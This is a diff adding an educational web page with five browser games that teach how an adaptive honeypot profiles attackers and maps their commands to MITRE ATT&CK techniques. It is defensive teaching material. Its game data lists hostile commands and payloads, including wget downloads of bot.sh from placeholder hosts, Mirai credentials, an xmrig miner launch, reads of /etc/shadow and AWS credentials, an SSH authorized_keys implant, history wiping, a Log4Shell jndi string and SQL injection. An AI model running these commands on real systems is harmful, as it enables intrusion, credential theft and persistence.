@@ -1,0 +1,174 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Learn & Play · Adaptive Honeypot</title>
+<link rel="icon" href="/img/favicon.svg" type="image/svg+xml">
+<link rel="stylesheet" href="/css/style.css">
+<script>try{var t=localStorage.getItem('ahp-theme');if(t&&t!=='system')document.documentElement.dataset.theme=t}catch(e){}</script>
+<script src="/js/common.js"></script>
+</head>
+<body>
+<main class="wrap">
+  <div class="page-head">
+    <div><h1>Learn &amp; Play</h1><p>Five short games that teach how the adaptive honeypot works. No security background needed.</p></div>
+    <span class="badge accent" id="totalBest"></span>
+  </div>
+  <div class="grid g3" id="tiles"></div>
+  <div class="card game-area" id="game" style="margin-top:18px;display:none"></div>
+</main>
+<script>
+(function () {
+  const $ = AHP.$, E = AHP.esc;
+  const best = (k, v) => { try { if (v !== undefined) { const o = +localStorage.getItem("ahp-g-" + k) || 0; if (v > o) localStorage.setItem("ahp-g-" + k, v); } return +localStorage.getItem("ahp-g-" + k) || 0; } catch (e) { return 0; } };
+  const shuffle = (a) => { a = a.slice(); for (let i = a.length - 1; i > 0; i--) { const j = Math.floor(Math.random() * (i + 1)); [a[i], a[j]] = [a[j], a[i]]; } return a; };
+  const SVG = {
+    quiz: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="12" cy="12" r="10"/><path d="M9.1 9a3 3 0 0 1 5.8 1c0 2-3 3-3 3M12 17h.01"/></svg>',
+    chain: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M10 13a5 5 0 0 0 7.5.5l3-3a5 5 0 0 0-7-7l-1.7 1.7"/><path d="M14 11a5 5 0 0 0-7.5-.5l-3 3a5 5 0 0 0 7 7l1.7-1.7"/></svg>',
+    brain: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M12 3v18M7 7a3 3 0 0 1 5-2M17 7a3 3 0 0 0-5-2M5 12a3 3 0 0 1 2-5M19 12a3 3 0 0 0-2-5M5 12a3 3 0 0 0 2 5 3 3 0 0 0 5 2M19 12a3 3 0 0 1-2 5 3 3 0 0 1-5 2"/></svg>',
+    target: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><circle cx="12" cy="12" r="6"/><circle cx="12" cy="12" r="2"/></svg>',
+    grid: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/><rect x="14" y="14" width="7" height="7" rx="1"/></svg>',
+  };
+  const GAMES = [
+    ["quiz", "Honeypot Basics Quiz", "10 questions on what honeypots are and why adaptation matters.", 10, quiz],
+    ["chain", "Build the Chain", "Put the architecture's linked-list nodes in the right order.", 10, chain],
+    ["engine", "Be the Adaptive Engine", "Read the attacker's behaviour, profile them, pick a strategy.", 12, engine],
+    ["catch", "Packet Catcher", "30 seconds: click only the malicious traffic.", 0, catcher],
+    ["attck", "ATT&CK Match", "Match attacker commands to MITRE ATT&CK techniques.", 8, attck],
+  ];
+  function tiles() {
+    $("#tiles").innerHTML = GAMES.map(([k, t, d, max]) => `<div class="card game-tile" data-g="${k}"><div class="ic">${SVG[{ quiz: "quiz", chain: "chain", engine: "brain", catch: "target", attck: "grid" }[k]]}</div><h3>${t}</h3><p class="small muted">${d}</p><div class="row"><span class="badge">best: ${best(k)}${max ? " / " + max : ""}</span><span class="spacer"></span><button class="btn sm primary">Play</button></div></div>`).join("");
+    $("#totalBest").textContent = "Total best score: " + GAMES.reduce((s, g) => s + best(g[0]), 0);
+    AHP.$$(".game-tile").forEach((t) => (t.onclick = () => { const g = GAMES.find((x) => x[0] === t.dataset.g); const area = $("#game"); area.style.display = "block"; area.scrollIntoView({ behavior: "smooth" }); g[4](area); }));
+  }
+  const finish = (area, key, score, max, msg, again) => {
+    best(key, score); tiles();
+    area.innerHTML = `<div style="text-align:center;padding:30px"><div class="score">${score}${max ? " / " + max : ""}</div><h3>${msg}</h3><div class="row" style="justify-content:center;margin-top:12px"><button class="btn primary" id="again">Play again</button><a class="btn" href="/index.html">Read the About page</a><a class="btn soft" href="/lab.html">Try the real Lab</a></div></div>`;
+    $("#again").onclick = () => again(area);
+  };
+  const header = (title, sub, prog) => `<div class="card-h"><div><h2 style="margin:0">${title}</h2><div class="small muted">${sub}</div></div>${prog != null ? `<div style="width:160px"><div class="progress"><div style="width:${prog}%"></div></div></div>` : ""}</div>`;
+
+  // ------------------------------------------------------------ 1. quiz
+  const QUIZ = [
+    ["What is a honeypot?", ["A fake system that lures attackers so their behaviour can be studied", "An antivirus that deletes malware", "A firewall rule", "A password manager"], 0, "Nobody legitimate uses a honeypot, so every interaction with it is suspicious, and valuable to study."],
+    ["Why is any connection to a honeypot suspicious?", ["It has no real users or business purpose", "It is always on the internet", "It runs Linux", "It uses port 22"], 0, "Real users have no reason to touch it, so false positives are rare."],
+    ["What makes this honeypot 'adaptive'?", ["It changes its responses per attacker type, based on what kept similar attackers engaged", "It updates Windows", "It blocks all IPs", "It uses a bigger hard disk"], 0, "The UCB1 bandit learns which strategy works best for each attacker profile."],
+    ["What does the 'static' strategy exist for?", ["As a baseline to measure how much adaptation helps", "To crash attackers", "To save memory", "It is a bug"], 0, "Keeping a control group lets the dashboard show the uplift of adaptive strategies."],
+    ["An attacker runs 'wget http://x/bot.sh' inside the decoy. What happens?", ["Nothing is downloaded; the URL is recorded as an IOC and fake output is shown", "The file is downloaded and run", "The PC shuts down", "The attacker gets real root access"], 0, "Containment: decoys never make outbound connections."],
+    ["What is a 'breadcrumb' or canary credential?", ["A fake secret planted to lure attackers; using it triggers an alert", "A cookie", "A real admin password", "A log file"], 0, "If the canary password is ever reused, you know exactly where it was stolen from."],
+    ["What does MITRE ATT&CK provide?", ["A shared catalogue of attacker tactics and techniques (e.g. T1110 Brute Force)", "A virus scanner", "An encryption standard", "A cloud provider"], 0, "Tagging events with ATT&CK IDs makes reports comparable across teams."],
+    ["What is STIX 2.1 used for here?", ["Sharing indicators of compromise with other tools and CSIRTs", "Drawing charts", "Logging in", "Speeding up the CPU"], 0, "The STIX bundle can be imported into MISP, OpenCTI and other TIPs."],
+    ["Why rotate personas (morphing)?", ["So fingerprints collected by scanners go stale and the decoy is harder to spot", "To change the theme colour", "To save disk space", "To delete logs"], 0, "Hostname, banners and OS change on a schedule."],
+    ["Which setting immediately stops all decoys from accepting attackers?", ["Kill switch", "Dark mode", "Retention days", "Morph interval"], 0, "Area 7 (Containment) has the kill switch."],
+  ];
+  function quiz(area) {
+    let i = 0, score = 0; const qs = shuffle(QUIZ).map((q) => { const order = shuffle(q[1].map((t, k) => [t, k])); return [q[0], order.map((o) => o[0]), order.findIndex((o) => o[1] === q[2]), q[3]]; });
+    const show = () => {
+      if (i >= qs.length) return finish(area, "quiz", score, qs.length, score >= 8 ? "Excellent: you understand honeypots!" : "Good start. Read the About page and try again.", quiz);
+      const q = qs[i];
+      area.innerHTML = header("Honeypot Basics Quiz", `Question ${i + 1} of ${qs.length} · score ${score}`, (100 * i) / qs.length) + `<h3>${E(q[0])}</h3>${q[1].map((o, k) => `<button class="choice" data-k="${k}">${E(o)}</button>`).join("")}<div id="exp" class="notice" style="display:none;margin-top:10px"></div>`;
+      AHP.$$(".choice", area).forEach((b) => (b.onclick = () => {
+        if (area.dataset.lock === "1") return; area.dataset.lock = "1";
+        const k = +b.dataset.k; if (k === q[2]) score++;
+        AHP.$$(".choice", area).forEach((x) => { if (+x.dataset.k === q[2]) x.classList.add("right"); else if (x === b) x.classList.add("wrong"); });
+        $("#exp").style.display = "block"; $("#exp").innerHTML = (k === q[2] ? "<b>Correct.</b> " : "<b>Not quite.</b> ") + E(q[3]) + ' <button class="btn sm primary" id="nx" style="margin-left:8px">Next</button>';
+        $("#nx").onclick = () => { area.dataset.lock = "0"; i++; show(); };
+      }));
+    };
+    area.dataset.lock = "0"; show();
+  }
+
+  // ------------------------------------------------------------ 2. chain
+  const CHAIN = ["Attacker", "Sensor layer (decoys)", "Containment gate", "Session + consistency store", "Adaptive engine", "Response generator", "Data pipeline", "Storage", "Alerting + threat intel", "Console + reports"];
+  function chain(area) {
+    let pool = shuffle(CHAIN), placed = [], start = Date.now();
+    const draw = () => {
+      area.innerHTML = header("Build the Chain", "Click the nodes in the order data flows through the system: head first, NULL last.") +
+        `<div class="grid g2"><div><h4>Available nodes</h4><div class="dz">${pool.map((n) => `<div class="chip" data-n="${E(n)}">${E(n)}</div>`).join("") || '<span class="faint small">All placed</span>'}</div></div>
+         <div><h4>Your linked list</h4><div class="dz">${placed.map((n, i) => `<div class="chip" data-p="${i}" title="click to remove"><b class="mono" style="color:var(--accent)">${i + 1} →</b> ${E(n)}</div>`).join("")}<span class="mono faint small">→ NULL</span></div></div></div>
+         <div class="row" style="margin-top:14px"><button class="btn primary" id="check" ${pool.length ? "disabled" : ""}>Check order</button><button class="btn" id="reset">Reset</button></div><div id="res" style="margin-top:10px"></div>`;
+      AHP.$$("[data-n]", area).forEach((c) => (c.onclick = () => { pool = pool.filter((x) => x !== c.dataset.n); placed.push(c.dataset.n); draw(); }));
+      AHP.$$("[data-p]", area).forEach((c) => (c.onclick = () => { const n = placed.splice(+c.dataset.p, 1)[0]; pool.push(n); draw(); }));
+      $("#reset").onclick = () => chain(area);
+      $("#check").onclick = () => {
+        const correct = placed.filter((n, i) => n === CHAIN[i]).length;
+        AHP.$$("[data-p]", area).forEach((c, i) => c.style.borderColor = placed[i] === CHAIN[i] ? "var(--ok)" : "var(--bad)");
+        if (correct === CHAIN.length) { const secs = Math.round((Date.now() - start) / 1000); setTimeout(() => finish(area, "chain", correct, CHAIN.length, `Perfect chain in ${secs}s! Attacker → … → Console → NULL`, chain), 900); }
+        else $("#res").innerHTML = `<div class="notice">${correct} of ${CHAIN.length} nodes are in the right position (green). Click a red node to put it back and try again. Hint: containment checks happen before a session opens.</div>`;
+      };
+    };
+    draw();
+  }
+
+  // ------------------------------------------------------------ 3. engine
+  const CASES = [
+    { t: "Logs in as root/xc3511, then sends 6 commands in under a second: enable; system; shell; /bin/busybox ECCHI; wget …/mirai.arm7", p: "bot", s: "tarpit", why: "Machine-speed typing and Mirai strings = bot. A tarpit slows it down (longer engagement, more samples)." },
+    { t: "Connects to SSH, reads the banner, sends 'SSH-2.0-Go' and disconnects.", p: "scanner", s: "static", why: "A banner grab: nothing to engage. A cheap static response is enough." },
+    { t: "Waits 2s between commands: id, sudo -l, cat /etc/passwd, ls -la /root/.ssh, history -c", p: "skilled", s: "breadcrumbs", why: "Careful, human-paced privilege checks and log wiping = skilled. Breadcrumbs (fake creds) lure them deeper and trigger canary alerts." },
+    { t: "Runs uname -a, nproc, then wget xmrig.tar.gz, chmod +x xmrig, ./xmrig -o stratum+tcp://…", p: "script_kiddie", s: "rich", why: "Commodity miner commands = script kiddie. Rich interaction keeps them trying, revealing pools and wallets (IOCs)." },
+    { t: "HTTP requests with User-Agent sqlmap/1.8 firing ' OR '1'='1 at /login, 14 paths in 2 seconds", p: "scanner", s: "breadcrumbs", why: "Scanner UA + rapid enumeration = scanner. Exposing a fake /.env breadcrumb can turn it into a traceable canary hit." },
+    { t: "Reads /robots.txt, then /.env, waits, then logs in to the portal using the DB_PASSWORD it found", p: "skilled", s: "rich", why: "Following breadcrumbs and reusing credentials = skilled. High interaction maximises intelligence (and fires a critical canary alert)." },
+  ];
+  const PROF = { bot: "Automated bot", scanner: "Scanner", script_kiddie: "Script kiddie", skilled: "Skilled attacker" };
+  const STR = { static: "Static", tarpit: "Tarpit", breadcrumbs: "Breadcrumbs", rich: "Rich / LLM" };
+  function engine(area) {
+    const cs = shuffle(CASES); let i = 0, score = 0;
+    const show = () => {
+      if (i >= cs.length) return finish(area, "engine", score, cs.length * 2, score >= 10 ? "You think like the adaptive engine!" : "Nice. The engine also learns from rewards; try again.", engine);
+      const c = cs[i]; let pick = null;
+      area.innerHTML = header("Be the Adaptive Engine", `Case ${i + 1} of ${cs.length} · score ${score}`, (100 * i) / cs.length) +
+        `<div class="term" style="height:auto;margin-bottom:14px"><span class="pr">observed&gt;</span> ${E(c.t)}</div>
+         <h4>1. Who is this?</h4><div class="row">${Object.entries(PROF).map(([k, l]) => `<button class="btn" data-p="${k}">${l}</button>`).join("")}</div>
+         <h4 style="margin-top:14px">2. Which strategy?</h4><div class="row">${Object.entries(STR).map(([k, l]) => `<button class="btn" data-s="${k}" disabled>${l}</button>`).join("")}</div><div id="exp" style="margin-top:12px"></div>`;
+      AHP.$$("[data-p]", area).forEach((b) => (b.onclick = () => { pick = b.dataset.p; AHP.$$("[data-p]", area).forEach((x) => { x.disabled = true; if (x.dataset.p === c.p) x.classList.add("primary"); }); if (pick === c.p) score++; else b.classList.add("danger", "on"); AHP.$$("[data-s]", area).forEach((x) => (x.disabled = false)); }));
+      AHP.$$("[data-s]", area).forEach((b) => (b.onclick = () => { const ok = b.dataset.s === c.s; if (ok) score++; AHP.$$("[data-s]", area).forEach((x) => { x.disabled = true; if (x.dataset.s === c.s) x.classList.add("primary"); }); if (!ok) b.classList.add("danger", "on");
+        $("#exp").innerHTML = `<div class="notice">${pick === c.p && ok ? "<b>Spot on.</b> " : "<b>Engine's view:</b> "}${E(c.why)} <button class="btn sm primary" id="nx">Next</button></div>`; $("#nx").onclick = () => { i++; show(); }; }));
+    };
+    show();
+  }
+
+  // ------------------------------------------------------------ 4. packet catcher
+  const BAD = ["GET /.env", "' OR '1'='1", "wget http://x/bot.sh", "${jndi:ldap://x/a}", "../../etc/passwd", "root:xc3511", "chmod 777 .x", "history -c", "Modbus WRITE 12=9999", "User-Agent: sqlmap", "xmrig -o stratum", "cat /root/.aws/credentials"];
+  const GOOD = ["GET /index.html", "ping reply", "DNS query: example.com", "TLS handshake", "GET /favicon.ico", "NTP sync", "ARP who-has 10.0.0.1", "HTTP 200 OK", "Modbus READ 0..10", "SSH keepalive"];
+  function catcher(area) {
+    let score = 0, misses = 0, left = 30, timer, spawner;
+    area.innerHTML = header("Packet Catcher", "Click malicious traffic (+1). Clicking normal traffic costs a point (-1).") + `<div class="row" style="margin-bottom:10px"><span class="badge accent">Score <b id="sc">0</b></span><span class="badge">Time <b id="tl">30</b>s</span><span class="badge">Missed attacks <b id="ms">0</b></span></div><div class="packet-field" id="field"></div>`;
+    const field = $("#field");
+    const spawn = () => {
+      const bad = Math.random() < 0.55, txt = (bad ? BAD : GOOD)[Math.floor(Math.random() * (bad ? BAD.length : GOOD.length))];
+      const p = document.createElement("div"); p.className = "packet"; p.textContent = txt;
+      p.style.top = Math.random() * 280 + "px"; p.style.left = "-220px";
+      field.appendChild(p);
+      const W = field.clientWidth + 240, speed = 70 + Math.random() * 70; let x = -220, last = performance.now(), dead = false;
+      const step = (t) => { if (dead) return; x += ((t - last) / 1000) * speed; last = t; p.style.left = x + "px"; if (x > W) { dead = true; p.remove(); if (bad) { misses++; $("#ms").textContent = misses; } return; } requestAnimationFrame(step); };
+      requestAnimationFrame(step);
+      p.onclick = () => { if (dead) return; dead = true; score += bad ? 1 : -1; $("#sc").textContent = score; p.style.background = bad ? "var(--ok-soft)" : "var(--bad-soft)"; p.style.borderColor = bad ? "var(--ok)" : "var(--bad)"; setTimeout(() => p.remove(), 250); };
+    };
+    spawner = setInterval(spawn, 650);
+    timer = setInterval(() => { left--; $("#tl").textContent = left; if (left <= 0) { clearInterval(timer); clearInterval(spawner); finish(area, "catch", Math.max(0, score), 0, `Caught ${score} net. Missed ${misses} attacks. The real pipeline tags these automatically with ATT&CK and IOCs.`, catcher); } }, 1000);
+  }
+
+  // ------------------------------------------------------------ 5. ATT&CK match
+  const MATCH = [
+    ["wget http://203.0.113.9/bot.sh", "T1105 Ingress Tool Transfer"], ["cat /etc/shadow", "T1003.008 /etc/passwd and /etc/shadow"],
+    ["crontab -e (adds miner)", "T1053.003 Cron"], ["echo key >> ~/.ssh/authorized_keys", "T1098.004 SSH Authorized Keys"],
+    ["history -c", "T1070.003 Clear Command History"], ["uname -a; lscpu", "T1082 System Information Discovery"],
+    ["Modbus write to register 12", "T0855 Unauthorized Command Message"], ["50 passwords in 10 seconds", "T1110.001 Password Guessing"],
+  ];
+  function attck(area) {
+    const rounds = shuffle(MATCH); let i = 0, score = 0;
+    const show = () => {
+      if (i >= rounds.length) return finish(area, "attck", score, rounds.length, score >= 6 ? "You speak ATT&CK!" : "Keep practising; the dashboard shows these IDs live.", attck);
+      const [cmd, ans] = rounds[i]; const opts = shuffle([ans, ...shuffle(MATCH.filter((m) => m[1] !== ans)).slice(0, 3).map((m) => m[1])]);
+      area.innerHTML = header("ATT&CK Match", `Round ${i + 1} of ${rounds.length} · score ${score}`, (100 * i) / rounds.length) + `<div class="term" style="height:auto;margin-bottom:12px"><span class="pr">attacker$</span> ${E(cmd)}</div>${opts.map((o) => `<button class="choice" data-o="${E(o)}">${E(o)}</button>`).join("")}`;
+      AHP.$$(".choice", area).forEach((b) => (b.onclick = () => { const ok = b.dataset.o === ans; if (ok) score++; AHP.$$(".choice", area).forEach((x) => { if (x.dataset.o === ans) x.classList.add("right"); else if (x === b) x.classList.add("wrong"); x.disabled = true; }); setTimeout(() => { i++; show(); }, 1100); }));
+    };
+    show();
+  }
+
+  AHP.init("games", false).then(tiles);
+})();
+</script>
+</body>
+</html>
